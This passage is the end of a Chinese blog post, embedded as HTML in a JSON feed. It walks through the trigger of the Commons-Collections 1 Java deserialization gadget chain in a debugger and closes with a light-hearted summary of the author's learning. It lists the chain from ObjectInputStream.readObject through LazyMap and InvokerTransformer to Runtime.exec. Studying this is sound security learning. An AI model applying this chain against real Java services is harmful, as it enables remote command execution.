id=\"payload触发分析\"><a class=\"markdownIt-Anchor\" href=\"#payload触发分析\">#</a> payload 触发分析</h2>\n<p>以下是 POC 中给出的触发链，可以根据 Gadget 下断点（这样比较清晰感觉）</p>\n<p>根据上面 payload 构造的学习，我们可以更好的理解该利用链的触发</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\tGadget chain:</span></span><br><span class=\"line\"><span class=\"comment\">\t\tObjectInputStream.readObject()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tAnnotationInvocationHandler.readObject()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\tMap(Proxy).entrySet()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\tAnnotationInvocationHandler.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\tLazyMap.get()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\tChainedTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tConstantTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tClass.getMethod()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tRuntime.getRuntime()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tRuntime.exec()</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\tRequires:</span></span><br><span class=\"line\"><span class=\"comment\">\t\tcommons-collections</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br></pre></td></tr></table></figure>\n<p>首先从 PayloadRunner38 行进入反序列化</p>\n<p>其中 serialized 是我们序列化后的 payload</p>\n<p><img src=\"41.png\" alt=\"\"></p>\n<p>进入 ObjectInputStream#readObject</p>\n<p><img src=\"42.png\" alt=\"\"></p>\n<p>在 AnnotationInvocationHandler#readObject 处下断点，查看调用栈</p>\n<p>观察到在 ObjectInputStream 中通过反射调用了 AnnotationInvocationHandler#readObject</p>\n<p><img src=\"43.png\" alt=\"\"></p>\n<p>进入 AnnotationInvocationHandler#readObject</p>\n<p>此处 memberValues 为我们传入的代理对象 proxyMap</p>\n<p><img src=\"45.png\" alt=\"\"></p>\n<p>调用其任意方法，就会进入 AnnotationInvocationHandler#invoke</p>\n<p>这里要进入函数一直点点点，其中会多次返回该行</p>\n<p><img src=\"46.png\" alt=\"\"></p>\n<p>直到再次进入 AnnotationInvocationHandler#readObject，运行至 355 行进入函数，会跳转至 AnnotationInvocationHandler#invoke</p>\n<p><img src=\"47.png\" alt=\"\"></p>\n<p>查看当前函数调用栈</p>\n<p>handler1 的 readObject -&gt; 代理对象的 entrySet -&gt; handler2 的 invoke</p>\n<p><img src=\"48.png\" alt=\"\"></p>\n<p>构造 handler2 时，传入的 Map 对象就是我们构造好的 LazyMap</p>\n<p>此时只要有调用 LazyMap#get，就会执行 transform</p>\n<p>查看当前变量，this.memberValues 就是 LazyMap 对象</p>\n<p><img src=\"49.png\" alt=\"\"></p>\n<p>往下滑滑滑滑滑</p>\n<p>在 78 行找到 <code>this.memberValues.get(var4)</code>  啦</p>\n<p><img src=\"50.png\" alt=\"\"></p>\n<p>调试进入 LazyMap#get，其中当获取的 key 不存在时，会进入 if 代码块调用我们构造好的 transform</p>\n<p><img src=\"51.png\" alt=\"\"></p>\n<p>查看变量，执行的 transform 就是我们构造好的，会通过反射获取函数执行命令</p>\n<p><img src=\"53.png\" alt=\"\"></p>\n<p>查看函数调用栈，和分析中相同</p>\n<p><img src=\"52.png\" alt=\"\"></p>\n<p>调到这里就完成触发啦:happy:</p>\n<p>⭐碰见了很多奇奇怪怪的问题，比如根本不会跳进 LazyMap#get 中 if 中的代码块，或者还没到这就已经弹窗了，或者细调时根本不会弹窗… 困扰了我很久😪</p>\n<p>但是正常运行是没有问题的，所以我取消了所有除此之外的断点，查看函数调用栈和变量都 OK 了</p>\n<p>所以感觉应该是 debug 在实现自身功能时有影响到正常代码的触发，这里说明一下啦</p>\n<h1 id=\"哔哔哔口水总结\"><a class=\"markdownIt-Anchor\" href=\"#哔哔哔口水总结\">#</a> 哔哔哔口水总结</h1>\n<p>看 p 神的文章，一点一点仔细看了一遍</p>\n<p><img src=\"54.png\" alt=\"\"></p>\n<p>然后脑袋瓜子就糊了</p>\n<p><img src=\"55.jpg\" alt=\"\"></p>\n<p>然后就从 URLDNS 开始再看一遍</p>\n<p>然后发现哇塞</p>\n<p>URLDNS 真的好简单耶</p>\n<p>怎么会有人看不懂这么简单的原理呀不会把不会吧</p>\n<p><img src=\"57.jpg\" alt=\"\"></p>\n<p>然后看 cc1，把 payload 原理又看了一遍，什么 transform 也太简单了把，不就是这样吗，这有什么难度吗？？？</p>\n<p><img src=\"58.jpg\" alt=\"\"></p>\n<p>然后看触发原理调试的时候就是这样了 (beiwei)</p>\n<p><img src=\"59.png\" alt=\"\"></p>\n<p>由其是还碰见了调试上的问题</p>\n<p>左左右右调试了一两个星期把</p>\n<p><img src=\"60.jpeg\" alt=\"\"></p>\n<p>一直想把整个过程简洁优雅的总结出来，所以不断地总结总结，画图记笔记…</p>\n<p>因为能简单的把问题解释清楚才能证明自己是真的理解了（不然就和第一遍看 p 大文章的情况一样了）</p>\n<p>然后调完了理解了总结了记笔记了，我又行了</p>\n<p><img src=\"58.jpg\" alt=\"\"></p>\n<p>这也太简单了吧</p>\n<p>不会吧不会吧会难道还有人看不懂 cc1 吗</p>\n<p>以上作死的行为只是想提醒自己，很多很难的知识点一定要自己动手去试，多总结，一定要写文章记录下来（年纪大了真的会忘的），细节不要放过，一点一点抠</p>\n<p>我真的不是小天才，我只是个小神仙罢了，唉</p>\n<p><img src=\"61.gif\" alt=\"\"></p>\n<p>下图是在理解触发原理时自己写的一个大概的流程（尽量简洁但是不是很简洁）</p>\n<p>看不看得懂就看缘分了😴</p>\n<p><img src=\"60.png\" alt=\"\"></p>\n",
            "tags": [
                "Java反序列化"
            ]
        }
    ]
}